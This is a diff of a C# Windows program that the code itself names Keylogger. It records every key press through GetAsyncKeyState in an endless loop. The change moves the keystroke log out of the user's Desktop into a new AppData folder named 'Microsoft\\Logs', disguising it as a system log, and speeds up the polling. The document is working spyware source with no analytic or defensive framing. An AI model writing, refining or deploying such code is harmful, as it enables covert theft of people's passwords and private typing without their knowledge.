@@ -1,27 +1,33 @@
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
 using System.Windows.Forms;
 
-class InputLogger {
-    private static StreamWriter writer;
+class Keylogger
+{
+    [DllImport("User32.dll")]
+    private static extern short GetAsyncKeyState(Keys vKey);
 
-    [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(Keys vKey);
+    static void Main()
+    {
+        string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Logs");
+        Directory.CreateDirectory(logPath);
+        string filePath = Path.Combine(logPath, "input_log.txt");
 
-    static void Main() {
-        string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "input_log.txt");
-        writer = new StreamWriter(logPath, true);
-        writer.AutoFlush = true;
-
-        while (true) {
-            foreach (Keys key in Enum.GetValues(typeof(Keys))) {
-                if ((GetAsyncKeyState(key) & 0x8000) != 0) {
-                    writer.Write($"{DateTime.Now:HH:mm:ss} - {key}\n");
+        using (StreamWriter sw = new StreamWriter(filePath, true))
+        {
+            while (true)
+            {
+                foreach (Keys key in Enum.GetValues(typeof(Keys)))
+                {
+                    if (GetAsyncKeyState(key) == -32767)
+                    {
+                        sw.Write($"[{key}]");
+                        sw.Flush();
+                    }
                 }
+                System.Threading.Thread.Sleep(10);
             }
-            System.Threading.Thread.Sleep(100);
         }
     }
 }
